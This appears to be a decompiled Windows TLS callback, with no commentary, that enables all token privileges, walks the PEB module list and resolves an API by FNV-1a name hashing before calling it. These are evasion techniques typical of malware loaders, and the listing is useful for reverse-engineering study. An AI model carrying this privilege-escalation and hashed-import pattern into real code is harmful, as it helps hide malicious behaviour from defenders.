
void tls_callback_0(undefined8 param_1,int param_2)

{
  code *pcVar1;
  undefined8 *puVar2;
  longlong lVar3;
  HANDLE TokenHandle;
  BOOL BVar4;
  LUID *_Memory;
  uint uVar5;
  uint uVar6;
  ulonglong uVar7;
  code cVar8;
  undefined8 *puVar9;
  code *pcVar10;
  uint uVar11;
  char cVar12;
  longlong lVar13;
  ulonglong uVar14;
  char *pcVar15;
  uint uVar16;
  bool bVar17;
  undefined1 auVar18 [64];
  _TOKEN_PRIVILEGES local_78;
  HANDLE local_68;
  undefined8 local_60;
  
  local_60 = 0xfffffffffffffffe;
  if (param_2 != 1) {
    return;
  }
  OpenProcessToken((HANDLE)0xffffffffffffffff,0xf01ff,&local_68);
  TokenHandle = local_68;
  lVar13 = 0;
  auVar18 = ZEXT1264(ZEXT812(0));
  do {
    _Memory = operator_new(0xc);
    _Memory->LowPart = (DWORD)lVar13;
    *(undefined8 *)&_Memory->HighPart = 0x200000000;
    local_78.PrivilegeCount = 1;
    local_78.Privileges[0].Luid = *_Memory;
    local_78.Privileges[0].Attributes = 2;
    BVar4 = AdjustTokenPrivileges(TokenHandle,0,&local_78,0x10,auVar18._0_8_,auVar18._8_8_);
    if (BVar4 != 0) {
      GetLastError();
    }
    free(_Memory);
    lVar13 = lVar13 + 1;
  } while (lVar13 != 0x40);
  if (1 < (longlong)local_68 + 1U) {
    local_68 = (HANDLE)0x0;
    NtClose();
  }
  uVar5 = 0;
  lVar13 = readgsbase();
  puVar2 = (undefined8 *)
           **(undefined8 **)(*(longlong *)(*(longlong *)(lVar13 + 0x60) + 0x18) + 0x10);
  uVar6 = 0xff4737b2;
  puVar9 = puVar2;
  do {
    if (uVar5 == 0) {
LAB_14010177d:
      lVar3 = puVar9[6];
      uVar11 = *(uint *)(lVar3 + 0x88 + (longlong)*(int *)(lVar3 + 0x3c));
      lVar13 = lVar3 + (ulonglong)uVar11;
      if ((ulonglong)uVar11 != 0) {
        uVar7 = (ulonglong)*(uint *)(lVar13 + 0x18);
        do {
          bVar17 = uVar7 == 0;
          uVar7 = uVar7 - 1;
          if (bVar17) goto LAB_140101733;
          uVar14 = (ulonglong)*(uint *)((ulonglong)*(uint *)(lVar13 + 0x20) + lVar3 + uVar7 * 4);
          cVar12 = *(char *)(lVar3 + uVar14);
          if (cVar12 == '\0') {
            uVar16 = 0x117fd355;
          }
          else {
            pcVar15 = (char *)(uVar14 + lVar3 + 1);
            uVar16 = 0x117fd355;
            do {
              uVar16 = ((int)cVar12 ^ uVar16) * 0x1000193;
              cVar12 = *pcVar15;
              pcVar15 = pcVar15 + 1;
            } while (cVar12 != '\0');
          }
        } while (uVar16 != uVar6);
        uVar5 = *(uint *)((ulonglong)*(uint *)(lVar13 + 0x1c) + lVar3 +
                         (ulonglong)
                         *(ushort *)
                          ((ulonglong)*(uint *)(lVar13 + 0x24) + lVar3 + (uVar7 & 0xffffffff) * 2) *
                         4);
        pcVar10 = (code *)(lVar3 + (ulonglong)uVar5);
        if ((uVar5 <= uVar11) ||
           ((code *)(lVar13 + (ulonglong)*(uint *)(lVar3 + 0x8c + (longlong)*(int *)(lVar3 + 0x3c)))
            <= pcVar10)) {
          DAT_14012b2c0 = (*pcVar10)(0,1,0,0);
          return;
        }
        uVar6 = 0x117fd355;
        uVar5 = 0x117fd355;
        cVar8 = *pcVar10;
        while (cVar8 != (code)0x2e) {
          uVar5 = ((int)(char)cVar8 ^ uVar5) * 0x1000193;
          pcVar1 = pcVar10 + 1;
          pcVar10 = pcVar10 + 1;
          cVar8 = *pcVar1;
        }
        cVar8 = pcVar10[1];
        if (cVar8 != (code)0x0) {
          pcVar10 = pcVar10 + 2;
          uVar6 = 0x117fd355;
          do {
            uVar6 = ((int)(char)cVar8 ^ uVar6) * 0x1000193;
            cVar8 = *pcVar10;
            pcVar10 = pcVar10 + 1;
          } while (cVar8 != (code)0x0);
        }
        puVar9 = (undefined8 *)*puVar2;
      }
    }
    else {
      uVar11 = 0x117fd355;
      if (1 < (ushort)(*(int *)(puVar9 + 0xb) - 8U)) {
        lVar13 = 0;
        do {
          uVar11 = ((int)*(char *)(puVar9[0xc] + lVar13) ^ uVar11) * 0x1000193;
          lVar13 = lVar13 + 2;
        } while ((ulonglong)((*(int *)(puVar9 + 0xb) - 8U & 0xffff) >> 1) * 2 != lVar13);
      }
      if (uVar11 == uVar5) goto LAB_14010177d;
    }
LAB_140101733:
    puVar9 = (undefined8 *)*puVar9;
  } while( true );
}

